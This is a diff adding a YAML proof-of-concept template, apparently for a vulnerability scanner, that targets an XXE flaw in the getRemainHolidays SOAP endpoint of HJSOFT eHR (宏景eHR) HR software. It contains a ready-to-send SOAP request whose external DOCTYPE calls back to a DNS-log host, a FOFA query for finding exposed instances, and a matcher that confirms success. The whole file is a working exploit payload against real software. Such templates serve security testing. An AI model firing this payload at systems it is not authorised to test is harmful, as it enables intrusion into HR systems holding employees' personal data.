@@ -1,0 +1,27 @@
+id: poc-yaml-hjsoft-ehr-getremainholidays-xxe
+info:
+  name: 宏景eHR getRemainHolidays XXE漏洞
+  severity: high
+  tags:
+  - DNSLOG
+  - xxe
+  finger: 宏景eHR
+  fofa: app="HJSOFT-HCM"
+variables:
+  reverse: new_dns_log()
+  domain: reverse.Domain()
+requests:
+- method: POST
+  path: /services/HrpService
+  headers:
+    SOAPAction: ''
+    Content-Type: text/xml;charset=UTF-8
+  data: "<!DOCTYPE syscode SYSTEM \"http://{{.domain}}/getRemainHolidays\">\n<soapenv:Envelope\
+    \ xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\" xmlns:hrp=\"http://www.hjsj.com/HrpService\"\
+    >\n   <soapenv:Header/>\n   <soapenv:Body>\n      <hrp:getRemainHolidays>\n  \
+    \       <hrp:in0>ORs1P9DMem9byoEeSArcK+T60iqKxo6h2M7ONzAhR7w=</hrp:in0>\n    \
+    \     <hrp:in1>cni23</hrp:in1>\n         <hrp:in2><syscode>&send;</syscode></hrp:in2>\n\
+    \      </hrp:getRemainHolidays>\n   </soapenv:Body>\n</soapenv:Envelope>"
+  expression: status_code == 500 && contains(body,"java.io.IOException") && contains(body,"getRemainHolidays")
+    && contains(content_type,"text/xml") && reverse.Verify()
+transport: http
